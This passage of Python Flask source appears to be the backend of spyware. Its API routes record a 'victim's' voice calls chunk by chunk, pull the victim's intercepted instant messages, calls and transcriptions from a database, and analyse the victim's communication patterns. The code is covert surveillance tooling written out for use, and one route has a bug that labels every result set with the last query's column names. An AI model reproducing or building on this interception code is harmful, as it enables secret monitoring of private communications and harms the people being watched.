        def start_recording():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                interceptor.start_voice_call_recording(victim_id, call_data)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(start_recording)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error starting voice recording: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/voice-chunk/<call_id>', methods=['POST'])
def api_voice_chunk(call_id):
    """Process voice call audio chunk"""
    try:
        chunk_data = request.get_json()
        
        interceptor = MessageInterceptor()
        
        def process_chunk():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                interceptor.process_voice_chunk(call_id, chunk_data)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(process_chunk)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error processing voice chunk: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/end-voice-recording/<call_id>', methods=['POST'])
def api_end_voice_recording(call_id):
    """End voice call recording"""
    try:
        interceptor = MessageInterceptor()
        
        def end_recording():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                interceptor.end_voice_call_recording(call_id)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(end_recording)
        result = future.result(timeout=120)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error ending voice recording: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/communication-data/<victim_id>')
def api_get_communication_data(victim_id):
    """Get all communication data for victim"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get instant messages
        cursor.execute('''
            SELECT * FROM instant_messages 
            WHERE victim_id = ? 
            ORDER BY timestamp_sent DESC LIMIT 100
        ''', (victim_id,))
        messages = cursor.fetchall()
        
        # Get voice calls
        cursor.execute('''
            SELECT * FROM voice_calls 
            WHERE victim_id = ? 
            ORDER BY start_time DESC
        ''', (victim_id,))
        voice_calls = cursor.fetchall()
        
        # Get transcriptions
        cursor.execute('''
            SELECT * FROM voice_transcriptions 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        transcriptions = cursor.fetchall()
        
        conn.close()
        
        return jsonify({
            'victim_id': victim_id,
            'instant_messages': [dict(zip([col[0] for col in cursor.description], row)) for row in messages],
            'voice_calls': [dict(zip([col[0] for col in cursor.description], row)) for row in voice_calls],
            'transcriptions': [dict(zip([col[0] for col in cursor.description], row)) for row in transcriptions]
        })
        
    except Exception as e:
        log_activity(f"❌ Error getting communication data: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/communication-patterns/<victim_id>')
def api_get_communication_patterns(victim_id):
    """Get communication patterns analysis for victim"""
    try:
        interceptor = MessageInterceptor()
        
        def analyze_patterns():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                interceptor.analyze_communication_patterns(victim_id)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(analyze_patterns)
        patterns = future.result(timeout=60)
        
        return jsonify({
            'victim_id': victim_id,
            'patterns': patterns,
            'analysis_timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        log_activity(f"❌ Error analyzing communication patterns: {e}")
        return jsonify({'error': str(e)}), 500